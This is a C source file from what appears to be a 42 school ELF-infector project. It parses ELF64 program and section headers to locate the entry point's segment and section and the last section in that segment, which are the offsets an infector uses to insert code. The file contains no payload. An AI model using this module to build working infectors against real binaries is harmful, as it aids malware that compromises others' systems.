/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   find_entry.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/05/10 23:43:29 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/19 01:01:32 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"
#include "utils.h"
#include "errors.h"

struct	data
{
	struct entry	*stored_entry;
	Elf64_Addr	e_entry;
};

static bool	find_entry_shdr(struct safe_pointer info, const size_t offset, void *data)
{
	struct data		*closure        = data;
	struct entry		*stored_entry   = closure->stored_entry;
	Elf64_Shdr		*elf64_sect_hdr = safe(offset, sizeof(Elf64_Shdr));

	if (!elf64_sect_hdr) errors(ERR_FILE, _ERR_BAD_SHDR_OFF);

	const Elf64_Addr	sh_addr = (elf64_sect_hdr->sh_addr);
	const Elf64_Xword	sh_size = (elf64_sect_hdr->sh_size);

	if (sh_addr <= closure->e_entry && closure->e_entry < sh_addr + sh_size)
		stored_entry->safe_shdr = elf64_sect_hdr;

	const Elf64_Off		p_offset  = (stored_entry->safe_phdr->p_offset);
	const Elf64_Off		sh_offset = (elf64_sect_hdr->sh_offset);
	const Elf64_Xword	p_filesz  = (stored_entry->safe_phdr->p_filesz);

	const size_t		end_of_ptload = p_offset + p_filesz;
	const size_t		end_of_sect   = sh_offset + sh_size;

	if (end_of_sect <= end_of_ptload
	&& (end_of_sect > stored_entry->end_of_last_section))
	{
		stored_entry->safe_last_section_shdr = elf64_sect_hdr;
		stored_entry->end_of_last_section = end_of_sect;
	}

	return true;
}

static bool	find_entry_phdr(struct safe_pointer info, const size_t offset, void *data)
{
	struct data		*closure       = data;
	struct entry		*stored_entry  = closure->stored_entry;
	Elf64_Phdr		*elf64_seg_hdr = safe(offset, sizeof(Elf64_Phdr));

	if (!elf64_seg_hdr) return errors(ERR_FILE, _ERR_BAD_PHDR_OFF);

	const Elf64_Addr	p_vaddr = (elf64_seg_hdr->p_vaddr);
	const Elf64_Xword	p_memsz = (elf64_seg_hdr->p_memsz);

	if (p_vaddr <= closure->e_entry && closure->e_entry < p_vaddr + p_memsz)
		stored_entry->safe_phdr = elf64_seg_hdr;
	return (true);
}

bool		find_entry(struct entry *original_entry, struct safe_pointer info)
{
	struct data	closure;
	Elf64_Ehdr	*safe_elf64_hdr;

	safe_elf64_hdr = safe(0, sizeof(Elf64_Ehdr));
	if (!safe_elf64_hdr) return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);
	closure.e_entry = (safe_elf64_hdr->e_entry);

	ft_bzero(original_entry, sizeof(*original_entry));
	closure.stored_entry = original_entry;

	if (!foreach_phdr(info, find_entry_phdr, &closure))
		return errors(ERR_THROW, _ERR_FIND_ENTRY);
	if (!original_entry->safe_phdr) // TODO is this check actually useful?
		return false;

	if (!foreach_shdr(info, find_entry_shdr, &closure))
		return errors(ERR_THROW, _ERR_FIND_ENTRY);
	if (!original_entry->safe_shdr) // TODO is this check actually useful?
		return false;

	const Elf64_Addr sh_addr  = (original_entry->safe_shdr->sh_addr);

	original_entry->offset_in_section = closure.e_entry - sh_addr;

	if (original_entry->end_of_last_section == 0)
		return errors(ERR_FILE, _ERR_NO_SECT_IN_ENTRY_SEG);

	return (true);
}
